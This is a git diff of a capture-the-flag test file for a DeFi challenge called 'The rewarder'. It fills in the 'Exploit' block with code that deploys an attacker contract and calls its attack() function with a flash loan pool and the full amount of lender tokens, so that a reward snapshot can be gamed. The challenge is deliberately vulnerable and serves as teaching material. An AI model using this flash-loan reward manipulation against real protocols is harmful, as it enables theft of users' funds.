@@ -3,6 +3,7 @@ const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const FlashLoanerPool = contract.fromArtifact('FlashLoanerPool');
 const TheRewarderPool = contract.fromArtifact('TheRewarderPool');
+const TheRewarderPoolAttacker = contract.fromArtifact('TheRewarderPoolAttacker');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const RewardToken = contract.fromArtifact('RewardToken');
 const AccountingToken = contract.fromArtifact('AccountingToken');
@@ -43,7 +44,7 @@ describe('[Challenge] The rewarder', function () {
 
         // Advance time 5 days so that depositors can get rewards
         await time.increase(time.duration.days(5));
-        
+
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.distributeRewards({ from: users[i] });
@@ -52,7 +53,7 @@ describe('[Challenge] The rewarder', function () {
             ).to.be.bignumber.eq(ether('25'));
         }
         expect(await this.rewardToken.totalSupply()).to.be.bignumber.eq(ether('100'));
-        
+
         // Two rounds should have occurred so far
         expect(
             await this.rewarderPool.roundNumber()
@@ -61,6 +62,14 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        await time.increase(time.duration.days(5));
+        const helper = await TheRewarderPoolAttacker.new({ from: attacker });
+        helper.attack(
+          this.rewarderPool.address,
+          this.flashLoanPool.address,
+          TOKENS_IN_LENDER_POOL,
+          { from: attacker }
+        );
     });
 
     after(async function () {
@@ -76,7 +85,7 @@ describe('[Challenge] The rewarder', function () {
                 await this.rewardToken.balanceOf(users[i])
             ).to.be.bignumber.eq(ether('25'));
         }
-        
+
         // Rewards must have been issued to the attacker account
         expect(await this.rewardToken.totalSupply()).to.be.bignumber.gt(ether('100'));
         expect(await this.rewardToken.balanceOf(attacker)).to.be.bignumber.gt('0');
